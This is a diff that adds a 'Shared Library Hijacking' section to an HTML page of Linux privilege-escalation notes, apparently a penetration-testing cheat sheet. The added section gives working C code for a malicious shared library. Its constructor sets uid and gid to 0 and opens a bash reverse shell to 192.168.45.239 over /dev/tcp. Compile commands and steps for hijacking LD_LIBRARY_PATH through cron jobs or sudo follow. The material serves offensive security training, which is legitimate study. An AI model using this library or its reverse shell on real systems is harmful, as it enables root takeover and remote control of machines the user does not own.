@@ -424,6 +424,41 @@ void main(){
                         </a>
                     </ul> 
 
+                    <h2 id="Shared Library Hijacking">Shared Library Hijacking</h2>
+                    <ul>
+                        <p>In some ocasions we may find a binary that when being executed it says that a library is missing. In this ocasions we can do the following. Take the following code and save it as a .c file</p>
+                        <pre><code class="language-c">#include &lt;stdio.h&gt;
+
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+static void revShell() __attribute__((constructor));
+
+void revShell() {
+
+  setuid(0);
+  setgid(0);
+  printf("Reverse Shell via library hijacking... \n");
+  const char *ncshell = "bash -i >& /dev/tcp/192.168.45.239/21 0>&1";
+  system(ncshell);
+}</code></pre>
+                    <p>Compile the code</p>
+                    <pre><code class="language-bash">gcc -Wall -fPIC -c mylibrary.c -o mylibrary.o</code></pre>        
+                    <p>Compile the shared library</p>
+                    <pre><code class="language-bash">gcc -shared mylibrary.o -o libmylibrary.so</code></pre>
+                    <p>Transfer the shared library to the target system</p>
+                    <p>Rename the file to match the expected missing library name</p>
+                    <h3>Crontab situation</h3>
+                    <ul>
+                    <p>Now in case this binary is being executed for the crontab check the <b>LD_LIBRARY_PATH</b> variable at the top and look for any of the routes where you are able to copy the .so file</p>
+                    </ul>
+                    <h3>Able to run binary as sudo situation</h3>
+                    <ul>
+                    <p>If you are able to run the binary as sudo simply modify the <b>LD_LIBRARY_PATH</b> variable to include the path to your malicious .so file</p>
+                    <pre><code class="language-bash">export LD_LIBRARY_PATH=/path/to/your/malicious/library:$LD_LIBRARY_PATH</code></pre>   
+                    </ul>    
+                    </ul>
+
                     <h2 id="Abusing Wildcards">Abusing Wildcards</h2>
                     <ul>
                         <p>In case you found an script that uses wildcards ( * ). For example:</p>
